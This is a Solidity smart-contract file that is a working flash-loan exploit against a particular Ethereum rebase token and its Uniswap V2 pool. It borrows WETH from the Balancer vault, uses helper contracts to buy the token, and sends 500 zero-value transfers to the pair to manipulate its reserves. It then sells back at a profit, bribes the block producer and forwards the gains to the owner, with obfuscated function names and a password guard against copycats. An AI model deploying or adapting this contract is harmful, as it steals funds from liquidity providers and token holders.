// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

interface IERC20{
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function deposit() external payable;
    function withdraw(uint wad) external;
    function burn(uint amount) external returns(bool);
    function mint(uint256 amount) external returns (bool );
}

interface IUniswapV2Router{
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
}

interface IUniswapV2Pair{
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

interface IRebase{
    function swapAndTrans() external;
    function divideFunds() external;
    function _maxWalletToken() external view returns(uint);
}

interface IBal{
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external ;
}

contract rebase{
    address private constant MonTokeN=0x9bD725c8B77bA0A869a567da46B43A9Db8dB4ca4;
    address private constant WETH=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;    
    address private constant vault=0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private constant router=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant pair=0x5b431e0F7fe1A38B040712Bf5D47922A50F43EBD;
    
    address immutable owNer;
    uint private passWD=0;

    rebaseHelper rbhp1;
    rebaseHelper rbhp2;
    rebaseHelper rbhp3;

    constructor(){
        owNer=msg.sender;
        passWD+=1;
    }

    modifier OnLyOWner(){
        require(msg.sender == owNer,"not oner");
        _;
    }

    function TodayIsSaturDayFirst(uint _pawd) public OnLyOWner(){
        require(_pawd == passWD,"wrong");
        NeedMonEyFroMBalFir();
        
        uint profit=IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).withdraw(profit);
        if(profit>1e17){
            payable(block.coinbase).transfer(1e17);
        }
        payable(owNer).transfer(address(this).balance);
        
    }

    function TodayIsSaturDaySecond(uint _pawd) public OnLyOWner(){
        NeedMonEyFroMBalSec();
        require(_pawd == passWD,"wrong");
        uint profit=IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).withdraw(profit);
        if(profit>1e17){
            payable(block.coinbase).transfer(1e17);
        }
        payable(owNer).transfer(address(this).balance);
        
        
    }

    function NeedMonEyFroMBalFir() internal{
        address[] memory tokens=new address[](1);
        tokens[0]=WETH;
        uint256[] memory amounts=new uint256[](1);
        amounts[0]=5 ether;
        bytes memory choice=abi.encode(1);
        IBal(vault).flashLoan(address(this), tokens, amounts, choice);
    }

    function NeedMonEyFroMBalSec() internal{
        address[] memory tokens=new address[](1);
        tokens[0]=WETH;
        uint256[] memory amounts=new uint256[](1);
        amounts[0]=5 ether;
        bytes memory choice=abi.encode(2);
        IBal(vault).flashLoan(address(this), tokens, amounts, choice);
    }


    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts,uint256[] memory feeAmounts,bytes memory userData) external{
        require(msg.sender == vault,"caller wrong");
        uint choice=abi.decode(userData,(uint));
        
        if (choice ==1){
            rbhp1=new rebaseHelper();
            IERC20(WETH).transfer(address(rbhp1), 2 ether);
            rebaseHelper(rbhp1).swapTokenFir();

            rbhp2=new rebaseHelper();
            IERC20(WETH).transfer(address(rbhp2), 2 ether);
            rebaseHelper(rbhp2).swapTokenFir();
            
        }if (choice == 2){
            rbhp3=new rebaseHelper();
            IERC20(WETH).transfer(address(rbhp3), 2 ether);
            rebaseHelper(rbhp3).swapTokenSec();
        }
        
        for(uint i=0;i<500;i++){
            IERC20(MonTokeN).transfer(pair, 0);
        }

        if(choice == 1){
            rebaseHelper(rbhp1).swapWeth();
            rebaseHelper(rbhp2).swapWeth();
        }if(choice ==2){
            rebaseHelper(rbhp3).swapWeth();
        }
        
        IERC20(WETH).transfer(vault, amounts[0]);
    }

    function ReCueToKEn(address _token,uint _value) public OnLyOWner(){
        IERC20(_token).transfer(owNer, _value);
    }

    function WiTHDrawEth(address _to) public OnLyOWner(){
        payable(_to).transfer(address(this).balance);
    }

    function ObacsFunc(uint _pawd) public OnLyOWner(){
        passWD-=_pawd;
    }

    function receiveFlashLoan(uint _pawd) public OnLyOWner(){
        passWD+=_pawd;
    }

    fallback() external  payable {}
}


contract rebaseHelper{
    address private constant MonTokeN=0x9bD725c8B77bA0A869a567da46B43A9Db8dB4ca4;
    address private constant WETH=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;    
    address private constant router=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant pair=0x5b431e0F7fe1A38B040712Bf5D47922A50F43EBD;
    address immutable owNer;
    constructor(){
        owNer=msg.sender;
    }

    modifier OnLyOWner(){
        require(msg.sender == owNer,"not oner");
        _;
    }

    function swapTokenFir() public OnLyOWner(){
        
        (uint r0,uint r1,)=IUniswapV2Pair(pair).getReserves();
        uint wethneed=IUniswapV2Router(router).getAmountIn(21_0000 ether, r1, r0);
        IERC20(WETH).transfer(pair, wethneed);
        IUniswapV2Pair(pair).swap(21_0000 ether, 0, address(this), "");
    }

    function swapTokenSec() public OnLyOWner(){
        uint bal=IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).approve(router, type(uint).max);
        address[] memory path=new address[](2);
        path[0]=WETH;
        path[1]=MonTokeN;
        IUniswapV2Router(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(bal, 1, path, address(this), block.timestamp);
    }

    function swapWeth() public OnLyOWner(){
        uint balr=IERC20(MonTokeN).balanceOf(address(this))*99/100;
        IERC20(MonTokeN).approve(router, type(uint).max);
        address[] memory pathr=new address[](2);
        pathr[0]=MonTokeN;
        pathr[1]=WETH;
        IUniswapV2Router(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(balr, 1, pathr, address(this), block.timestamp);

        uint bal=IERC20(WETH).balanceOf(address(this));
        IERC20(WETH).transfer(msg.sender, bal);
    }

}
